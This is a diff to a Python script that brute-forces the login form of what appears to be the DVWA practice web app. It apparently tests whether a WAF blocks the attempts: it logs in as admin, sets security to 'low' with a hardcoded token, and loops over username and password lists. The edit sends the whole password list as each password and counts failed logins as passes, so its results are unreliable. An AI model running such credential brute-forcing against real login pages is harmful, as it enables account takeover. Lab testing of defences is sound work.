@@ -5,6 +5,7 @@ import json
 from datetime import datetime
 from pathlib import Path
 import os
+from bs4 import BeautifulSoup
 
 # Setup directories and session
 logs_dir = Path('logs')
@@ -20,7 +21,7 @@ else:
     sys.exit(1)
 
 # Map request rate to a specific time interval
-delays = {'low': 7, 'medium': 2, 'high': 0.5}
+delays = {'low': 15, 'medium': 2, 'high': 0.5}
 delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized
 
 # Construct the target URL for brute force attacks
@@ -29,23 +30,24 @@ login_url = f"{base_url}/login.php"
 security_url = f"{base_url}/security.php"
 
 def login_and_setup_security():
-    response = session.get(login_url)
-    token = 'EXTRACTED_CSRF_TOKEN'  # Add your extraction logic here
+    #response = session.get(login_url)
     data = {
         'username': 'admin',
         'password': 'password',
         'Login': 'Login',
-        'user_token': token
     }
     session.post(login_url, data=data)
-    response = session.get(security_url)
-    security_token = 'EXTRACTED_SECURITY_TOKEN'  # Add logic to extract security token
+    time.sleep(delay) 
+    
+    #response = session.get(security_url)
+    security_token = 'b33ea9835a4b1a8c442c4bb9df199a53'  # Add logic to extract security token
     data = {
         'security': 'low',
         'seclev_submit': 'Submit',
         'user_token': security_token
     }
     session.post(security_url, data=data)
+    time.sleep(delay) 
 
 def brute_force_attack():
     results = []
@@ -58,26 +60,27 @@ def brute_force_attack():
         for pw in passwords:
             data = {
                 'username': username,
-                'password': pw,
+                'password': passwords,
                 'Login': 'Login'
             }
             response = session.post(target_url, data=data)
             success = response.status_code == 200 and "Welcome to the password protected area" in response.text
+            no_user = response.status_code == 200 and "Welcome to the password protected area" not in response.text
             failure = "Username and/or password incorrect." in response.text
             response_code = response.status_code
 
             total_tests += 1
             if success:
                 tests_passed += 1
-                result_status = "PASSED"
+                result_status = "PASSED - User exists"
+            elif no_user:
+                tests_passed += 1
+                result_status = "PASSED - Successful request but the user does not exist"
             elif failure:
                 tests_failed += 1
-                result_status = "FAILED"
+                result_status = "FAILED - Incorrect username or password"
             else:
-                if response_code == 200:
-                    tests_failed += 1
-                    result_status = "FAILED - Username does not exist"
-                elif response_code in [429, 403]:
+                if response_code in [429, 403]:
                     tests_failed += 1
                     result_status = "FAILED - WAF blocked the brute force attack"
                 else:
